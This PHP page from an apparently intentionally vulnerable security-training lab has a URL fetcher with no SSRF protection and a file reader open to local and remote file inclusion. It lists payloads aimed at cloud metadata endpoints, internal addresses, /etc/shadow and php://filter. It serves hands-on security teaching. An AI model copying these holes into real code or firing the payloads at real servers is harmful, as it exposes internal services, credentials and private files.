<?php
require_once 'config.php';

$result = '';
$error = '';

// VULNERABLE: Server-Side Request Forgery (SSRF)
if (isset($_GET['url']) || isset($_POST['url'])) {
    $url = $_GET['url'] ?? $_POST['url'];
    
    // No validation - can fetch any URL including internal services
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    // VULNERABLE: Displays all response headers
    curl_setopt($ch, CURLOPT_HEADER, true);
    
    $response = curl_exec($ch);
    
    if (curl_errno($ch)) {
        $error = "Error: " . curl_error($ch);
    } else {
        $result = $response;
    }
    
    curl_close($ch);
}

// Alternative: file_get_contents (also vulnerable)
if (isset($_GET['file'])) {
    $file = $_GET['file'];
    // VULNERABLE: LFI/RFI
    $result = @file_get_contents($file);
    if ($result === false) {
        $error = "Could not read: $file";
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>URL Fetch - Security Testing Lab</title>
    <link rel="stylesheet" href="assets/css/style.css">
</head>
<body>
    <nav class="navbar">
        <div class="nav-container">
            <a href="index.php" class="logo">SecLab</a>
            <div class="nav-links">
                <a href="index.php" class="nav-link">Home</a>
                <a href="login.php" class="nav-link">Login</a>
                <a href="search.php" class="nav-link">Search</a>
                <a href="products.php" class="nav-link">Products</a>
                <a href="profile.php" class="nav-link">Profile</a>
                <a href="comments.php" class="nav-link">Comments</a>
                <a href="upload.php" class="nav-link">Upload</a>
                <a href="admin.php" class="nav-link">Admin</a>
                <a href="api.php" class="nav-link">API</a>
                <a href="decoder.php" class="nav-link">Decoder</a>
            </div>
        </div>
    </nav>

    <div class="container">
        <div class="grid grid-2">
            <div class="card">
                <div class="card-header">
                    <div class="card-icon">🌐</div>
                    <div>
                        <div class="card-title">URL Fetcher</div>
                        <div class="card-subtitle">Fetch content from any URL</div>
                    </div>
                </div>

                <form method="GET" action="fetch.php">
                    <div class="form-group">
                        <label class="form-label">URL to Fetch</label>
                        <input type="text" name="url" class="form-input" placeholder="https://example.com" value="<?php echo htmlspecialchars($_GET['url'] ?? ''); ?>">
                    </div>
                    <button type="submit" class="btn btn-primary">Fetch URL</button>
                </form>

                <div style="margin-top: 1.5rem; padding-top: 1.5rem; border-top: 1px solid var(--border-color);">
                    <h4 style="color: var(--accent-primary); margin-bottom: 1rem;">📁 File Reader</h4>
                    <form method="GET" action="fetch.php">
                        <div class="form-group">
                            <label class="form-label">File Path</label>
                            <input type="text" name="file" class="form-input" placeholder="/etc/passwd or C:\Windows\win.ini" value="<?php echo htmlspecialchars($_GET['file'] ?? ''); ?>">
                        </div>
                        <button type="submit" class="btn btn-secondary">Read File</button>
                    </form>
                </div>

                <?php if ($error): ?>
                    <div class="alert alert-error" style="margin-top: 1rem;">❌ <?php echo htmlspecialchars($error); ?></div>
                <?php endif; ?>

                <?php if ($result): ?>
                    <div style="margin-top: 1.5rem;">
                        <h4 style="color: var(--accent-primary); margin-bottom: 1rem;">Response:</h4>
                        <div class="response-box">
                            <pre><?php echo htmlspecialchars($result); ?></pre>
                        </div>
                    </div>
                <?php endif; ?>
            </div>

            <div class="card">
                <div class="card-header">
                    <div class="card-icon">⚠️</div>
                    <div>
                        <div class="card-title">SSRF Testing</div>
                        <div class="card-subtitle">Server-Side Request Forgery</div>
                    </div>
                </div>

                <h4 style="color: var(--accent-primary); margin-bottom: 1rem;">🎯 SSRF Payloads</h4>
                <div class="code-block">
# Internal services
http://localhost/
http://127.0.0.1/
http://[::1]/
http://localhost:80/
http://localhost:8080/

# Cloud metadata (AWS)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# Cloud metadata (GCP)
http://metadata.google.internal/

# Internal network scan
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/

# Protocol handlers
file:///etc/passwd
file:///C:/Windows/win.ini
dict://localhost:11211/
gopher://localhost:6379/
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">📁 LFI Payloads</h4>
                <div class="code-block">
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log

# Windows
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\xampp\htdocs\security-testing\config.php

# PHP wrappers
php://filter/convert.base64-encode/resource=config.php
php://input
data://text/plain,&lt;?php phpinfo();?&gt;
                </div>

                <h4 style="color: var(--accent-primary); margin: 1.5rem 0 1rem;">Quick Tests</h4>
                <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
                    <a href="fetch.php?url=http://localhost/" class="btn btn-secondary" style="font-size: 0.8rem;">localhost</a>
                    <a href="fetch.php?url=http://127.0.0.1/" class="btn btn-secondary" style="font-size: 0.8rem;">127.0.0.1</a>
                    <a href="fetch.php?file=C:/Windows/win.ini" class="btn btn-secondary" style="font-size: 0.8rem;">win.ini</a>
                    <a href="fetch.php?file=config.php" class="btn btn-secondary" style="font-size: 0.8rem;">config.php</a>
                </div>

                <div class="alert alert-warning" style="margin-top: 1.5rem;">
                    ⚠️ <strong>Note:</strong> This page can fetch internal resources and read local files. Use for SSRF and LFI testing.
                </div>
            </div>
        </div>
    </div>
</body>
</html>

